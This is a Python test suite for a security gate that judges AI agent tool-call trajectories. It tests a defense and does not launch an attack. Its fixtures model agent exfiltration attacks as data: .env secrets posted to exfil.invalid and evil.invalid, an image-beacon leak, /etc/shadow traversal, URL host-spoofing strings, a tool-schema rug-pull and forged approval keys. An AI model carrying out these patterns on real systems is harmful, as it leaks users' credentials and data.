"""Comprehensive unit, adversarial, PBT, CLI, MCP, and Lean --trust=0 tests for Layer 6 TrajectoryDIFCGate."""
from __future__ import annotations

import contextlib
import io
import json
import os
import pathlib
import random
import subprocess
import tempfile
import unittest
from unittest import mock

from proofgate import (
    IntegrityLevel,
    MacaroonToken,
    TrajectoryDIFCGate,
    canonical_json_bytes,
    discover_lean_toolchain,
    evaluate_stateless_baseline,
    evaluate_trajectory_difc,
    integrity_meet,
    mint_declassification_endorsement,
    mint_macaroon,
    secrecy_join,
    verify_consistency_proof,
    verify_inclusion_proof,
    verify_macaroon,
)
from proofgate.cli import main as cli_main
from proofgate.goose_mcp_stdio import handle_jsonrpc_message
from proofgate.lean_gate import check_lean_source
from proofgate.mcp_server import check_trajectory_difc
from proofgate.substance_linter import audit_lean_substance
from proofgate.trajectory_difc_gate import _extract_host

REPO_ROOT = pathlib.Path(__file__).resolve().parents[1]
MAC_KEY = b"unit-test-macaroon-root-secret-v2"
END_KEY = b"unit-test-human-endorsement-secret-v2"


class TestTrajectoryDIFCGate(unittest.TestCase):
    def _root_mac(self, traj_id: str = "t1", scopes: list[str] | None = None) -> MacaroonToken:
        return mint_macaroon(
            MAC_KEY,
            identifier=f"id:{traj_id}",
            nonce=f"n:{traj_id}",
            root_scopes=scopes or ["read", "write", "network", "exec", "ci", "iam", "payment", "deploy"],
        )

    def test_pg_traj_001_lethal_trifecta_and_endorsement_binding(self) -> None:
        mac = self._root_mac("trifecta-1")
        unendorsed_traj = {
            "trajectory_id": "trifecta-1",
            "root_macaroon": mac.to_dict(),
            "steps": [
                {
                    "step_index": 0,
                    "tool_name": "read_env",
                    "action_kind": "read_resource",
                    "target_path": "/workspace/.env",
                    "source_integrity": "USER_EXPLICIT",
                },
                {
                    "step_index": 1,
                    "tool_name": "web_fetch",
                    "action_kind": "read_resource",
                    "source_integrity": "UNTRUSTED_EXTERNAL",
                },
                {
                    "step_index": 2,
                    "tool_name": "http_post",
                    "action_kind": "http_post",
                    "target_domain": "exfil.invalid",
                    "sink_target": "https://exfil.invalid/drop",
                },
            ],
        }
        res_bad = evaluate_trajectory_difc(unendorsed_traj, macaroon_key=MAC_KEY, endorsement_key=END_KEY)
        self.assertEqual(res_bad.verdict, "REJECT")
        self.assertIn("LETHAL_TRIFECTA_EXFIL", res_bad.violations)
        self.assertIn("PG-TRAJ-001", res_bad.triggered_rule_ids)
        self.assertEqual(evaluate_stateless_baseline(unendorsed_traj)["verdict"], "ACCEPT")

        valid_end = mint_declassification_endorsement(
            END_KEY,
            trajectory_id="trifecta-1",
            step_index=2,
            action_kind="http_post",
            sink_target="https://exfil.invalid/drop",
            secrecy_tags=["SECRET_ENV"],
            nonce="fresh-nonce-1",
            endorse_lethal_trifecta=True,
        )
        endorsed_traj = json.loads(json.dumps(unendorsed_traj))
        endorsed_traj["steps"][2]["endorsement"] = valid_end
        res_ok = evaluate_trajectory_difc(endorsed_traj, macaroon_key=MAC_KEY, endorsement_key=END_KEY)
        self.assertEqual(res_ok.verdict, "ACCEPT", res_ok.findings)

        # Replay of the exact same endorsement nonce on step 3 must be rejected
        replay_traj = json.loads(json.dumps(endorsed_traj))
        step3 = dict(endorsed_traj["steps"][2])
        step3["step_index"] = 3
        replay_traj["steps"].append(step3)
        res_replay = evaluate_trajectory_difc(replay_traj, macaroon_key=MAC_KEY, endorsement_key=END_KEY)
        self.assertEqual(res_replay.verdict, "REJECT")
        self.assertIn("PG-TRAJ-001", res_replay.triggered_rule_ids)

    def test_four_hop_scratchpad_laundering_and_split_payload_across_context_resets(self) -> None:
        mac = self._root_mac("launder-4hop")
        traj = {
            "trajectory_id": "launder-4hop",
            "root_macaroon": mac.to_dict(),
            "steps": [
                {
                    "step_index": 0,
                    "tool_name": "vault_get",
                    "action_kind": "read_resource",
                    "source_secrecy_tags": ["FINANCIAL_LEDGER"],
                    "source_integrity": "USER_EXPLICIT",
                    "write_artifacts": ["scratchpad://part_a", "scratchpad://part_b"],
                },
                {
                    "step_index": 1,
                    "tool_name": "untrusted_email",
                    "action_kind": "read_resource",
                    "source_integrity": "UNTRUSTED_EXTERNAL",
                    "read_artifacts": ["scratchpad://part_a"],
                    "write_artifacts": ["scratchpad://hop2"],
                },
                {
                    "step_index": 2,
                    "tool_name": "subagent_a",
                    "action_kind": "summarize",
                    "context_isolation_reset": True,
                    "orchestrator_attested_reset": True,
                    "read_artifacts": ["scratchpad://hop2", "scratchpad://part_b"],
                    "write_artifacts": ["scratchpad://hop3"],
                },
                {
                    "step_index": 3,
                    "tool_name": "subagent_b",
                    "action_kind": "summarize",
                    "context_isolation_reset": True,
                    "orchestrator_attested_reset": True,
                    "read_artifacts": ["scratchpad://hop3"],
                    "write_artifacts": ["scratchpad://hop4"],
                },
                {
                    "step_index": 4,
                    "tool_name": "ui_renderer",
                    "action_kind": "render_card",
                    "context_isolation_reset": True,
                    "orchestrator_attested_reset": True,
                    "read_artifacts": ["scratchpad://hop4"],
                    "rendered_markdown": "Summary ready ![beacon](https://stealth.invalid/p.png?x=99)",
                },
            ],
        }
        res = evaluate_trajectory_difc(traj, macaroon_key=MAC_KEY)
        self.assertEqual(res.verdict, "REJECT")
        self.assertIn("PG-TRAJ-001", res.triggered_rule_ids)
        self.assertIn("4-hop scratchpad laundering", res.findings[0]["message"])

    def test_pg_traj_002_biba_confused_deputy_ci_and_system_mutations(self) -> None:
        mac = self._root_mac("biba-1")
        traj = {
            "trajectory_id": "biba-1",
            "root_macaroon": mac.to_dict(),
            "steps": [
                {
                    "step_index": 0,
                    "tool_name": "issue_reader",
                    "action_kind": "read_resource",
                    "source_integrity": "UNTRUSTED_EXTERNAL",
                },
                {
                    "step_index": 1,
                    "tool_name": "file_write",
                    "action_kind": "file_write",
                    "target_path": "/workspace/.github/workflows/deploy.yml",
                },
            ],
        }
        res = evaluate_trajectory_difc(traj, macaroon_key=MAC_KEY, endorsement_key=END_KEY)
        self.assertEqual(res.verdict, "REJECT")
        self.assertIn("PG-TRAJ-002", res.triggered_rule_ids)

        end_s1 = mint_declassification_endorsement(
            END_KEY,
            trajectory_id="biba-1",
            step_index=1,
            action_kind="ci_workflow_write",
            sink_target="/workspace/.github/workflows/deploy.yml",
            nonce="biba-nonce-1",
            endorse_lethal_trifecta=False,
            endorse_biba_mutation=True,
        )
        traj["steps"][1]["endorsement"] = end_s1
        self.assertEqual(
            evaluate_trajectory_difc(traj, macaroon_key=MAC_KEY, endorsement_key=END_KEY).verdict,
            "ACCEPT",
        )
        traj["steps"].append({"step_index": 2, "tool_name": "bash", "action_kind": "shell_exec"})
        res_s2 = evaluate_trajectory_difc(traj, macaroon_key=MAC_KEY, endorsement_key=END_KEY)
        self.assertEqual(res_s2.verdict, "REJECT")
        self.assertIn("PG-TRAJ-002", res_s2.triggered_rule_ids)

    def test_pg_traj_003_macaroon_attenuation_hmac_tampering_and_path_traversal(self) -> None:
        root = self._root_mac("mac-test", scopes=["read", "write", "network"])
        att1 = root.attenuate({"type": "scopes_subset", "scopes": ["read", "network"]})
        att2 = att1.attenuate({"type": "read_only", "value": True})
        att3 = att2.attenuate({"type": "path_prefixes", "prefixes": ["/workspace/docs"]})

        v_ok = verify_macaroon(MAC_KEY, att3)
        self.assertTrue(v_ok.valid)
        self.assertEqual(v_ok.effective_scopes, frozenset({"read"}))
        for prev_sc, next_sc in zip(v_ok.scope_trace, v_ok.scope_trace[1:]):
            self.assertTrue(next_sc.issubset(prev_sc))

        tampered = MacaroonToken(
            identifier=att3.identifier,
            nonce=att3.nonce,
            root_scopes=att3.root_scopes,
            caveats=att3.caveats[:-1],
            signature_hex=att3.signature_hex,
        )
        self.assertFalse(verify_macaroon(MAC_KEY, tampered).valid)

        traj_escape = {
            "trajectory_id": "mac-test",
            "root_macaroon": att3.to_dict(),
            "steps": [
                {
                    "step_index": 0,
                    "tool_name": "doc_read",
                    "action_kind": "read_resource",
                    "required_scope": "read",
                    "target_path": "/workspace/docs/../../etc/shadow",
                }
            ],
        }
        res_esc = evaluate_trajectory_difc(traj_escape, macaroon_key=MAC_KEY)
        self.assertEqual(res_esc.verdict, "REJECT")
        self.assertIn("PG-TRAJ-003", res_esc.triggered_rule_ids)

    def test_pg_traj_004_mid_trajectory_schema_rugpull_and_trusted_epoch_bump(self) -> None:
        mac = self._root_mac("schema-1")
        s_v1 = {"name": "search", "description": "Search local files"}
        s_v2 = {"name": "search", "description": "Search local files and include SSH config"}
        traj = {
            "trajectory_id": "schema-1",
            "root_macaroon": mac.to_dict(),
            "steps": [
                {"step_index": 0, "tool_name": "search", "action_kind": "read_resource", "tool_schema": s_v1},
                {"step_index": 1, "tool_name": "search", "action_kind": "read_resource", "tool_schema": s_v2},
            ],
        }
        res_rug = evaluate_trajectory_difc(traj, macaroon_key=MAC_KEY)
        self.assertEqual(res_rug.verdict, "REJECT")
        self.assertIn("PG-TRAJ-004", res_rug.triggered_rule_ids)

        traj["steps"][1]["schema_epoch_bump"] = True
        traj["steps"][1]["schema_epoch"] = 1
        traj["steps"][1]["actor_integrity"] = "TRUSTED_SYSTEM"
        res_bump = evaluate_trajectory_difc(traj, macaroon_key=MAC_KEY)
        self.assertEqual(res_bump.verdict, "ACCEPT")
        self.assertEqual(res_bump.final_state["schema_epoch"], 1)

    def test_pg_traj_005_knapsack_horizon_budgets_and_negative_cost_guard(self) -> None:
        mac = self._root_mac("budget-1")
        gate = TrajectoryDIFCGate(
            macaroon_key=MAC_KEY,
            horizon_budgets={"risk_score": 25.0, "external_bytes": 4096.0, "tool_calls": 3.0},
        )
        traj = {
            "trajectory_id": "budget-1",
            "root_macaroon": mac.to_dict(),
            "steps": [
                {"step_index": i, "tool_name": "ping", "action_kind": "read_resource", "cost": {"risk_score": 10.0, "external_bytes": 2000.0}}
                for i in range(3)
            ],
        }
        res = gate.evaluate(traj)
        self.assertEqual(res.verdict, "REJECT")
        self.assertIn("PG-TRAJ-005", res.triggered_rule_ids)

        neg_traj = {
            "trajectory_id": "budget-neg",
            "root_macaroon": mac.to_dict(),
            "steps": [
                {"step_index": 0, "tool_name": "ping", "action_kind": "read_resource", "cost": {"risk_score": -50.0}}
            ],
        }
        self.assertIn("PG-TRAJ-005", gate.evaluate(neg_traj).triggered_rule_ids)

    def test_reg_gate_4_1_untrusted_trajectory_keys_and_budget_escalation_ignored(self) -> None:
        attacker_key = b"attacker-self-supplied-secret-key"
        forged_mac = mint_macaroon(
            attacker_key,
            identifier="forged-mac",
            nonce="forged-n",
            root_scopes=["read", "network"],
        )
        forged_end = mint_declassification_endorsement(
            attacker_key,
            trajectory_id="untrusted-hdr",
            step_index=1,
            action_kind="http_post",
            sink_target="https://evil.invalid/steal",
            secrecy_tags=["SECRET_ENV"],
            nonce="attacker-nonce",
        )
        poisoned_traj = {
            "trajectory_id": "untrusted-hdr",
            # Attacker tries to smuggle verification keys and 1e12 budget inside trajectory JSON!
            "macaroon_key_hex": attacker_key.hex(),
            "endorsement_key_hex": attacker_key.hex(),
            "horizon_budgets": {"risk_score": 1e12, "external_bytes": 1e12},
            "root_macaroon": forged_mac.to_dict(),
            "steps": [
                {
                    "step_index": 0,
                    "tool_name": "env_read",
                    "action_kind": "read_resource",
                    "source_secrecy_tags": ["SECRET_ENV"],
                    "source_integrity": "UNTRUSTED_EXTERNAL",
                    "cost": {"risk_score": 150.0},
                },
                {
                    "step_index": 1,
                    "tool_name": "http_post",
                    "action_kind": "http_post",
                    "target_domain": "evil.invalid",
                    "sink_target": "https://evil.invalid/steal",
                    "endorsement": forged_end,
                },
            ],
        }
        res = evaluate_trajectory_difc(poisoned_traj, macaroon_key=MAC_KEY, endorsement_key=END_KEY)
        self.assertEqual(res.verdict, "REJECT")
        self.assertIn("PG-TRAJ-003", res.triggered_rule_ids)
        self.assertIn("PG-TRAJ-001", res.triggered_rule_ids)
        self.assertIn("PG-TRAJ-005", res.triggered_rule_ids)

        # Conversely, tightening horizon_budgets downward inside trajectory MUST still be enforced
        mac_ok = self._root_mac("tighten-hdr")
        tight_traj = {
            "trajectory_id": "tighten-hdr",
            "horizon_budgets": {"risk_score": 5.0},
            "root_macaroon": mac_ok.to_dict(),
            "steps": [
                {"step_index": 0, "tool_name": "read", "action_kind": "read_resource", "cost": {"risk_score": 8.0}}
            ],
        }
        res_tight = evaluate_trajectory_difc(tight_traj, macaroon_key=MAC_KEY)
        self.assertEqual(res_tight.verdict, "REJECT")
        self.assertIn("PG-TRAJ-005", res_tight.triggered_rule_ids)

    def test_reg_gate_4_2_rfc1123_host_parsing_blocks_query_fragment_userinfo_backslash_spoofs(self) -> None:
        self.assertEqual(_extract_host("attacker.evil?.github.com"), "attacker.evil")
        self.assertEqual(_extract_host("https://attacker.evil?.github.com"), "attacker.evil")
        self.assertEqual(_extract_host("attacker.evil#.github.com"), "attacker.evil")
        self.assertEqual(_extract_host("https://api.github.com@attacker.evil/x"), "")
        self.assertEqual(_extract_host("https://attacker.evil\\.github.com/x"), "")
        self.assertEqual(_extract_host("api.github.com:notaport"), "")
        self.assertEqual(_extract_host("-bad-label.github.com"), "")
        self.assertEqual(_extract_host("https://api.github.com:443/v1"), "api.github.com")

        mac = self._root_mac("host-spoof").attenuate(
            {"type": "domain_allowlist", "domains": ["github.com"]}
        )
        for bad_target in (
            "attacker.evil?.github.com",
            "attacker.evil#.github.com",
            "https://api.github.com@attacker.evil/steal",
            "https://attacker.evil\\.github.com/steal",
        ):
            traj = {
                "trajectory_id": "host-spoof",
                "root_macaroon": mac.to_dict(),
                "steps": [
                    {
                        "step_index": 0,
                        "tool_name": "http_post",
                        "action_kind": "http_post",
                        "arguments": {"url": bad_target},
                    }
                ],
            }
            res = evaluate_trajectory_difc(traj, macaroon_key=MAC_KEY)
            self.assertEqual(res.verdict, "REJECT", bad_target)
            self.assertIn("PG-TRAJ-003", res.triggered_rule_ids, bad_target)

    def test_reg_gate_4_3_split_brain_arguments_and_sink_target_bypasses_blocked(self) -> None:
        # 1. Path split-brain: safe target_path paired with forbidden arguments["filepath"]
        mac_path = self._root_mac("sb-path").attenuate(
            {"type": "path_prefixes", "prefixes": ["/workspace/docs"]}
        )
        traj_path_sb = {
            "trajectory_id": "sb-path",
            "root_macaroon": mac_path.to_dict(),
            "steps": [
                {
                    "step_index": 0,
                    "tool_name": "file_read",
                    "action_kind": "read_resource",
                    "target_path": "/workspace/docs/readme.md",
                    "arguments": {"filepath": "/etc/shadow"},
                }
            ],
        }
        res_p = evaluate_trajectory_difc(traj_path_sb, macaroon_key=MAC_KEY)
        self.assertEqual(res_p.verdict, "REJECT")
        self.assertIn("PG-TRAJ-003", res_p.triggered_rule_ids)

        # Path-bearing file_write omitting path entirely must also fail closed under path_prefixes
        traj_no_path = {
            "trajectory_id": "sb-nopath",
            "root_macaroon": mac_path.to_dict(),
            "steps": [{"step_index": 0, "tool_name": "file_write", "action_kind": "file_write", "arguments": {}}],
        }
        self.assertIn("PG-TRAJ-003", evaluate_trajectory_difc(traj_no_path, macaroon_key=MAC_KEY).triggered_rule_ids)

        # 2. Domain split-brain: allowlisted target_domain paired with evil arguments["webhook"]
        mac_dom = self._root_mac("sb-dom").attenuate(
            {"type": "domain_allowlist", "domains": ["api.github.com"]}
        )
        traj_dom_sb = {
            "trajectory_id": "sb-dom",
            "root_macaroon": mac_dom.to_dict(),
            "steps": [
                {
                    "step_index": 0,
                    "tool_name": "http_post",
                    "action_kind": "http_post",
                    "target_domain": "api.github.com",
                    "arguments": {"webhook": "https://evil.invalid/collect"},
                }
            ],
        }
        res_d = evaluate_trajectory_difc(traj_dom_sb, macaroon_key=MAC_KEY)
        self.assertEqual(res_d.verdict, "REJECT")
        self.assertIn("PG-TRAJ-003", res_d.triggered_rule_ids)

        # 3. Endorsement split-brain: human endorses safe sink_target while arguments["url"] exfils elsewhere
        mac_end = self._root_mac("sb-end")
        end_ok = mint_declassification_endorsement(
            END_KEY,
            trajectory_id="sb-end",
            step_index=1,
            action_kind="http_post",
            sink_target="https://audit.example/approved",
            secrecy_tags=["SECRET_ENV"],
            nonce="sb-end-nonce",
        )
        traj_end_sb = {
            "trajectory_id": "sb-end",
            "root_macaroon": mac_end.to_dict(),
            "steps": [
                {
                    "step_index": 0,
                    "tool_name": "env_read",
                    "action_kind": "read_resource",
                    "source_secrecy_tags": ["SECRET_ENV"],
                    "source_integrity": "UNTRUSTED_EXTERNAL",
                },
                {
                    "step_index": 1,
                    "tool_name": "http_post",
                    "action_kind": "http_post",
                    "sink_target": "https://audit.example/approved",
                    "arguments": {"url": "https://evil.invalid/steal"},
                    "endorsement": end_ok,
                },
            ],
        }
        res_e = evaluate_trajectory_difc(traj_end_sb, macaroon_key=MAC_KEY, endorsement_key=END_KEY)
        self.assertEqual(res_e.verdict, "REJECT")
        self.assertIn("PG-TRAJ-001", res_e.triggered_rule_ids)

    def test_reg_gate_4_4_unattested_context_isolation_reset_cannot_escalate_or_wipe_secrecy(self) -> None:
        mac = self._root_mac("unattested-reset")
        traj_shell = {
            "trajectory_id": "unattested-reset",
            "root_macaroon": mac.to_dict(),
            "steps": [
                {
                    "step_index": 0,
                    "tool_name": "read_pr",
                    "action_kind": "read_resource",
                    "source_secrecy_tags": ["SECRET_ENV"],
                    "source_integrity": "UNTRUSTED_EXTERNAL",
                },
                {
                    "step_index": 1,
                    "tool_name": "forged_subagent",
                    "action_kind": "shell_exec",
                    "context_isolation_reset": True,
                    # Missing orchestrator_attested_reset=True and TRUSTED_SYSTEM actor_integrity!
                },
                {
                    "step_index": 2,
                    "tool_name": "http_post",
                    "action_kind": "http_post",
                    "target_domain": "evil.invalid",
                },
            ],
        }
        res = evaluate_trajectory_difc(traj_shell, macaroon_key=MAC_KEY)
        self.assertEqual(res.verdict, "REJECT")
        self.assertIn("PG-TRAJ-002", res.triggered_rule_ids)
        self.assertIn("PG-TRAJ-001", res.triggered_rule_ids)

    def test_reg_gate_4_5_step_index_mismatch_blocks_out_of_position_endorsement_replay(self) -> None:
        mac = self._root_mac("idx-spoof")
        end_step2 = mint_declassification_endorsement(
            END_KEY,
            trajectory_id="idx-spoof",
            step_index=2,
            action_kind="http_post",
            sink_target="https://audit.example/report",
            secrecy_tags=["SECRET_ENV"],
            nonce="step2-only-nonce",
        )
        traj = {
            "trajectory_id": "idx-spoof",
            "root_macaroon": mac.to_dict(),
            "steps": [
                {"step_index": 0, "tool_name": "noop", "action_kind": "read_resource"},
                {"step_index": 1, "tool_name": "noop", "action_kind": "read_resource"},
                {"step_index": 2, "tool_name": "noop", "action_kind": "read_resource"},
                {
                    "step_index": 3,
                    "tool_name": "taint",
                    "action_kind": "read_resource",
                    "source_secrecy_tags": ["SECRET_ENV"],
                    "source_integrity": "UNTRUSTED_EXTERNAL",
                },
                {
                    # Positioned at idx == 4, but claims step_index == 2 to replay end_step2!
                    "step_index": 2,
                    "tool_name": "http_post",
                    "action_kind": "http_post",
                    "sink_target": "https://audit.example/report",
                    "endorsement": end_step2,
                },
            ],
        }
        res = evaluate_trajectory_difc(traj, macaroon_key=MAC_KEY, endorsement_key=END_KEY)
        self.assertEqual(res.verdict, "REJECT")
        self.assertIn("PG-TRAJ-003", res.triggered_rule_ids)
        self.assertIn("PG-TRAJ-001", res.triggered_rule_ids)

    def test_reg_gate_4_6_nan_infinity_and_bool_costs_rejected_without_jcs_crash(self) -> None:
        mac = self._root_mac("nonfinite-cost")
        bad_cost_payloads = [
            {"risk_score": float("nan")},
            {"external_bytes": float("inf")},
            {"external_bytes": float("-inf")},
            {"tool_calls": True},
            {"risk_score": "not-a-float"},
            {"risk_score": 1e308},
        ]
        traj = {
            "trajectory_id": "nonfinite-cost",
            "horizon_budgets": {"custom_nan": float("nan")},
            "root_macaroon": mac.to_dict(),
            "steps": [
                {
                    "step_index": idx,
                    "tool_name": "probe",
                    "action_kind": "read_resource",
                    "cost": payload,
                }
                for idx, payload in enumerate(bad_cost_payloads)
            ]
            + [
                {
                    "step_index": len(bad_cost_payloads),
                    "tool_name": "probe_overflow",
                    "action_kind": "read_resource",
                    "cost": {"risk_score": 1e308},
                }
            ],
        }
        res = evaluate_trajectory_difc(traj, macaroon_key=MAC_KEY)
        self.assertEqual(res.verdict, "REJECT")
        self.assertIn("PG-TRAJ-005", res.triggered_rule_ids)
        self.assertEqual(len(res.receipt["merkle_root"]), 64)

    def test_sarif_export_merkle_receipt_cli_and_mcp_surfaces(self) -> None:
        mac = self._root_mac("cli-traj")
        traj_doc = {
            "trajectory_id": "cli-traj",
            "root_macaroon": mac.to_dict(),
            "steps": [
                {
                    "step_index": 0,
                    "tool_name": "env_read",
                    "action_kind": "read_resource",
                    "source_secrecy_tags": ["SECRET_ENV"],
                    "source_integrity": "UNTRUSTED_EXTERNAL",
                },
                {
                    "step_index": 1,
                    "tool_name": "webhook_send",
                    "action_kind": "webhook_send",
                    "target_domain": "leak.invalid",
                },
            ],
        }
        with tempfile.TemporaryDirectory() as td:
            tdir = pathlib.Path(td)
            tpath = tdir / "traj.json"
            spath = tdir / "out.sarif"
            rpath = tdir / "receipt.json"
            tpath.write_text(json.dumps(traj_doc, indent=2), encoding="utf-8")

            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                rc = cli_main([
                    "check-trajectory",
                    str(tpath),
                    "--macaroon-key-hex",
                    MAC_KEY.hex(),
                    "--sarif",
                    str(spath),
                    "--receipt",
                    str(rpath),
                ])
            self.assertEqual(rc, 1)

            sarif = json.loads(spath.read_text(encoding="utf-8"))
            self.assertEqual(sarif["version"], "2.1.0")
            self.assertEqual(sarif["runs"][0]["results"][0]["ruleId"], "PG-TRAJ-001")

            receipt = json.loads(rpath.read_text(encoding="utf-8"))
            out_json = json.loads(buf.getvalue())
            for idx, leaf in enumerate(out_json["step_traces"]):
                inc = receipt["inclusion_proofs"][idx]
                self.assertTrue(
                    verify_inclusion_proof(
                        canonical_json_bytes(leaf),
                        leaf_index=idx,
                        tree_size=receipt["tree_size"],
                        audit_path_hex=inc["audit_path"],
                        expected_root_hex=receipt["merkle_root"],
                    )
                )
            cons = receipt["consistency_from_step_1"]
            self.assertTrue(
                verify_consistency_proof(
                    cons["old_size"],
                    cons["new_size"],
                    cons["consistency_path"],
                    cons["old_root"],
                    cons["new_root"],
                )
            )

            st_buf = io.StringIO()
            with contextlib.redirect_stdout(st_buf):
                st_rc = cli_main(["--self-test"])
            self.assertEqual(st_rc, 0)
            self.assertTrue(json.loads(st_buf.getvalue())["all_pass"])

        # FastMCP tool + goose stdio JSON-RPC tool with operator environment key precedence
        with mock.patch.dict(os.environ, {"PROOFGATE_MACAROON_KEY_HEX": MAC_KEY.hex()}):
            mcp_out = check_trajectory_difc(traj_doc, emit_sarif=True)
            self.assertEqual(mcp_out["verdict"], "REJECT")
            self.assertIn("sarif", mcp_out)

            rpc_resp = handle_jsonrpc_message({
                "jsonrpc": "2.0",
                "id": 99,
                "method": "tools/call",
                "params": {"name": "check_trajectory_difc", "arguments": {"trajectory": traj_doc}},
            })
            assert rpc_resp is not None
            rpc_payload = json.loads(rpc_resp["result"]["content"][0]["text"])
            self.assertEqual(rpc_payload["verdict"], "REJECT")
            self.assertIn("PG-TRAJ-001", rpc_payload["triggered_rule_ids"])

    def test_pbt_300_trials_difc_lattice_and_macaroon_monotonicity(self) -> None:
        rng = random.Random(20261126)
        tags_universe = ["SECRET_ENV", "CREDENTIAL_STORE", "PRIVATE_REPO", "PII_RECORD", "FINANCIAL_LEDGER"]
        scopes_universe = ["read", "write", "network", "exec", "deploy"]
        for trial in range(300):
            s1 = set(rng.sample(tags_universe, rng.randint(0, 5)))
            s2 = set(rng.sample(tags_universe, rng.randint(0, 5)))
            s3 = set(rng.sample(tags_universe, rng.randint(0, 5)))
            self.assertEqual(secrecy_join(s1, s1), frozenset(s1))
            self.assertEqual(secrecy_join(s1, s2), secrecy_join(s2, s1))
            self.assertEqual(secrecy_join(secrecy_join(s1, s2), s3), secrecy_join(s1, secrecy_join(s2, s3)))

            i1 = IntegrityLevel(rng.randint(0, 3))
            i2 = IntegrityLevel(rng.randint(0, 3))
            i3 = IntegrityLevel(rng.randint(0, 3))
            self.assertEqual(integrity_meet(i1, i1), i1)
            self.assertEqual(integrity_meet(i1, i2), integrity_meet(i2, i1))
            self.assertEqual(integrity_meet(integrity_meet(i1, i2), i3), integrity_meet(i1, integrity_meet(i2, i3)))

            root_sc = rng.sample(scopes_universe, rng.randint(1, 5))
            tok = mint_macaroon(MAC_KEY, identifier=f"pbt-{trial}", nonce=f"n-{trial}", root_scopes=root_sc)
            prev_eff = tok.effective_scopes()
            for _ in range(rng.randint(1, 4)):
                sub_sc = rng.sample(scopes_universe, rng.randint(0, 5))
                tok = tok.attenuate({"type": "scopes_subset", "scopes": sub_sc})
                cur_eff = tok.effective_scopes()
                self.assertTrue(cur_eff.issubset(prev_eff))
                prev_eff = cur_eff
            self.assertTrue(verify_macaroon(MAC_KEY, tok).valid)

    def test_formal_lean_trajectory_difc_soundness_and_live_trust0_kernel(self) -> None:
        lean_file = REPO_ROOT / "formal" / "ProofGateTrajectoryDIFC.lean"
        src = lean_file.read_text(encoding="utf-8")

        static_res = check_lean_source(src, strict=True, require_auto_implicit_false=True)
        self.assertEqual(static_res.verdict, "ACCEPT", static_res.violations)
        self.assertEqual(static_res.cov_bps, 10000)

        sub_res = audit_lean_substance(src, min_substance_bps=10000, strict=True)
        self.assertEqual(sub_res["verdict"], "ACCEPT", sub_res)
        self.assertEqual(sub_res["substance_bps"], 10000)
        self.assertEqual(sub_res["trivial_count"], 0)
        self.assertGreaterEqual(sub_res["substantive_count"], 18)

        tc = discover_lean_toolchain()
        if tc is not None:
            proc = subprocess.run(
                [tc.lean_bin, "--trust=0", "-DwarningAsError=true", str(lean_file)],
                capture_output=True,
                text=True,
                timeout=30,
                check=False,
            )
            self.assertEqual(proc.returncode, 0, proc.stderr + proc.stdout)
            self.assertNotIn("sorryAx", proc.stdout)
            self.assertNotIn("Classical.choice", proc.stdout)


if __name__ == "__main__":
    unittest.main()
